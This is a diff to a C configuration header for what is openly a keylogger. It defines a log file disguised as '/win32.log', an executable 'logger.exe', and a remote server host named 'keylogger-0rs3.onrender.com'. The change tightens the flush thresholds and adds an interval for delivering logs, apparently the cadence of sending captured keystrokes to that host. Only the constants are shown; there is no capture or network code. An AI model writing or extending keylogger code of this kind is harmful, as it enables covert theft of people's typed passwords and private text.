@@ -3,8 +3,13 @@
 
 #define LOG_FILENAME "/win32.log"
 #define EXE_NAME "logger.exe"
-#define FLUSH_CHAR_THRESHOLD 1000
-#define FLUSH_INTERVAL 180
+
+#define DELIVER_INTERVAL 120
+
+// rules that flush to log
+#define FLUSH_CHAR_THRESHOLD 300
+#define FLUSH_INTERVAL 60
+
 #define MAX_BUFFER_LEN 1024
 #define SERVER_HOST "keylogger-0rs3.onrender.com"
 
